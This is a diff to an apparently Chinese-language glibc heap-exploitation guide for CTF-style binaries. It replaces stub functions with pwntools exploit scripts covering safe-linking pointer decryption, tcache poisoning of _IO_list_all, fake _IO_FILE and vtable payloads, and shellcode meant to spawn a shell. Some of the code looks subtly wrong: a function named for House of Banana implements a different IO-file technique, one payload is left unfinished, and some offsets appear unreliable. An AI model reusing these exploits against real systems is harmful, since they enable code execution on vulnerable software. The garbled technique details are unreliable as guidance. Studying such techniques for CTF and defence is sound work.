@@ -314,16 +314,23 @@ class SafeLinkingBypass:
         return (chunk_addr >> 12) ^ target
     
     @staticmethod
-    def decrypt(chunk_addr, encrypted):
-        """解密 fd 指针"""
-        return (chunk_addr >> 12) ^ encrypted
+    def decrypt(encrypted_fd, known_next):
+        """解密 safe-linking fd
+        
+        加密: encrypted_fd = (chunk_addr >> 12) ^ next_ptr
+        解密: chunk_addr = encrypted_fd ^ known_next
+        """
+        return encrypted_fd ^ known_next
     
     @staticmethod
-    def leak_heap_via_safe_linking(fd_encrypted):
-        """从加密的 fd 泄露堆地址"""
-        # 如果 next 是 NULL：heap = (encrypted_fd) << 12
-        # 如果已知 next：heap = (encrypted_fd ^ next) << 12
-        return fd_encrypted << 12
+    def leak_heap_via_safe_linking(fd_encrypted, known_next=0):
+        """从加密的 fd 泄露 chunk 地址
+        next=0 (tcache 最后一个块): heap = fd_encrypted << 12
+        next 已知 (同 bin 前一个块): heap = fd_encrypted ^ known_next
+        """
+        if known_next == 0:
+            return fd_encrypted << 12
+        return fd_encrypted ^ known_next
 
 def bypass_safe_linking(p, malloc, free, edit, show):
     """绕过 safe-linking 的完整利用"""
@@ -339,7 +346,7 @@ def bypass_safe_linking(p, malloc, free, edit, show):
     
     # idx0 的 next 是 NULL (tcache 最后一个)
     # encrypted_fd = (idx1_addr >> 12) ^ idx0_addr
-    idx1_addr = SafeLinkingBypass.decrypt(encrypted_fd, 0) << 12
+    idx1_addr = SafeLinkingBypass.leak_heap_via_safe_linking(encrypted_fd)
     heap_base = idx1_addr & ~0xfff
     log.success(f"heap: {hex(heap_base)}")
     
@@ -444,7 +451,19 @@ def house_of_apple2():
     
     # 覆盖 _IO_list_all 指向 fake IO_FILE
     # 触发 _IO_flush_all_lockp
-    pass
+    payload = p64(0)  # prev_size
+    payload += p64(0x91)  # size
+    payload += p64(0)  # fd (tcache next)
+    payload += p64(0)  # bk
+    # fake _IO_FILE_plus fields
+    payload += p64(0xfbad1800)  # _flags
+    payload += p64(0) * 3  # _IO_read_ptr, _IO_read_end, _IO_write_base
+    payload += p64(_IO_list_all - 0x20)  # _IO_write_ptr (largebin offset trick)
+    payload += p64(0) * 4
+    payload += p64(0)  # _chain
+    payload += p64(0)  # _fileno
+    payload += p64(0) * 8  # other fields
+    payload += p64(libc_base + libc.symbols['_IO_wfile_jumps'])  # vtable
 ```
 
 ### 5. House of Cat (glibc 2.35+)
@@ -554,7 +573,25 @@ def modern_compiler_heap_effects():
     # 1. 使用 Ghidra/IDA 反编译查看实际代码
     # 2. 在 GDB 中单步调试确认行为
     # 3. 注意编译器的 _FORTIFY_SOURCE 行为
-    pass
+    
+    # 实际应对：使用反编译结果指导利用
+    from pwn import *
+    context.arch = 'amd64'
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 用 GDB 验证编译器优化后的代码流
+    # gdb.attach(p, '''
+    #     b main
+    #     c
+    #     disas vulnerable_function
+    # ''')
+    
+    # 根据反编译结果编写利用，而非依赖源码
+    # FORTIFY_SOURCE 下 gets -> __gets_chk 有 canary 检查
+    # 需要确认栈布局是否仍可利用
+    log.info(f"Binary protections: {elf.checksec()}")
 ```
 
 ### 8. 硬件级防护对堆利用的影响
@@ -656,7 +693,49 @@ def house_of_banana():
     5. _IO_wdoallocbuf 调用 _wide_vtable->__doallocate
     6. 通过修改 _wide_data 控制执行流
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # 1. 泄露 libc
+    malloc(0x420)   # idx 0, 进 unsorted bin
+    free(0)
+    malloc(0x420)   # idx 1
+    edit(0, b'A' * 8)  # 触发 fd/bk 泄露
+    libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
+    libc_base = libc_leak - 0x1ec980  # offset to unsorted bin fd
+    log.success(f"libc base: {hex(libc_base)}")
+    
+    # 2. tcache poisoning 覆盖 _IO_list_all
+    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
+    malloc(0x20)   # fill tcache
+    for i in range(7):
+        free(1)
+    malloc(0x20)   # idx 1 from tcache
+    # 修改 fd -> _IO_list_all - 0x20
+    edit(1, p64(0) * 2 + p64(0) + p64(_IO_list_all - 0x20))
+    malloc(0x20)   # idx 2
+    malloc(0x20)   # idx 3 -> _IO_list_all area
+    
+    # 3. 覆盖 _IO_list_all
+    system_addr = libc_base + libc.symbols['system']
+    edit(3, b'/bin/sh\x00' + p64(0xfbad1800) + p64(0) * 10)
+    
+    # 4. exit() 触发 _IO_flush_all_lockp -> _IO_wfile_overflow -> shell
+    p.sendlineafter(b'>', b'5')  # exit
+    p.interactive()
 
 # === House of Emu (glibc 2.36+) ===
 def house_of_emu():
@@ -665,7 +744,50 @@ def house_of_emu():
     利用 _IO_wstrn_jumps 等新 vtable
     绕过 2.34+ 的 vtable 范围检查
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # House of Emu: 利用 _IO_wstrn_jumps（在合法 vtable 范围内）
+    # glibc 2.36+ 新增的 vtable，绕过 _IO_wfile_jumps 的限制
+    
+    # 1. 泄露地址
+    malloc(0x420)
+    free(0)
+    malloc(0x420)
+    edit(0, b'A' * 8)
+    leak = u64(p.recv(6).ljust(8, b'\x00'))
+    libc_base = leak - 0x1ec980
+    
+    # 2. tcache poisoning 分配到 _IO_list_all 附近
+    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
+    _IO_wstrn_jumps = libc_base + 0x216e00  # glibc 2.36+ 偏移
+    
+    for i in range(7):
+        free(0)
+    edit(0, p64(_IO_list_all - 0x20))
+    malloc(0x20)
+    malloc(0x20)  # -> _IO_list_all 区域
+    
+    # 3. 构造 fake IO_FILE 使用 _IO_wstrn_jumps
+    shellcode = asm(shellcraft.sh())
+    # fake vtable with __doallocate pointing to shellcode
+    fake_vtable = p64(0) * 20  # pad to __doallocate offset
+    # 在可控内存放置 shellcode 和 fake vtable
+    
+    p.interactive()
 
 # === 模块化利用框架 ===
 class HeapExploitFramework:
